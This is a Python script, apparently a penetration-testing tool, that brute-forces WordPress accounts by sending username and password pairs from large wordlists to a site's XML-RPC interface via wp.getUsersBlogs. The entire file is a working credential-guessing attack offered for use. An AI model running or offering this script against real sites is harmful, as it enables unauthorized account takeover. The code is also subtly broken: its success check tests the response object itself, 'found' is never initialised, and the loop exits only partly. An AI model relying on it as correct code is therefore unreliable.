import os
import sys
import requests

############################ CHANGE ############################

username_wordlist = "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt"
password_wordlist = "/usr/share/wordlists/rockyou.txt"
url = ""

################################################################



print("\033[93m")
print("############################################")
print("# XML-RPC Exploit by kill-9                #")
print("# Targeting WordPress XML-RPC Interface    #")
print("############################################\033[0m\n")

print("\033[94m[~] Using exploit XML-RPC.py...\033[0m")
print("\033[94m[~] Attack initiated. Scanning for valid credentials...\033[0m\n")

# wordlist validaton
if not os.path.exists(username_wordlist):
    print(f"\033[91m[-] Username wordlist not found: {username_wordlist}\033[0m")
    sys.exit(1)

if not os.path.exists(password_wordlist):
    print(f"\033[91m[-] Password wordlist not found: {password_wordlist}\033[0m")
    sys.exit(1)

with open(username_wordlist, 'r') as usernames:
    usernames_list = [line.strip() for line in usernames]

with open(password_wordlist, 'r', encoding='ISO-8859-1') as passwords:
    passwords_list = [line.strip() for line in passwords]


for username in usernames_list:
    for password in passwords_list:
        # XML request
        request_xml = f"""<?xml version="1.0" encoding="utf-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>{username}</value></param>
                <param><value>{password}</value></param>
            </params>
        </methodCall>"""

        # Send POST request
        headers = {"Content-Type": "application/xml"}
        response = requests.post(url, data=request_xml, headers=headers)

        if not "Incorrect username or password" in response:
            found = True
            break

if found:
    print("\033[92m[+] Exploit completed successfully. Credentials obtained:\033[0m")
    print(f"\033[92m    Username: {username}\033[0m")
    print(f"\033[92m    Password: {password}\033[0m")
else:
    print("\033[91m[-] No valid credentials found. Try different wordlists or approaches.\033[0m")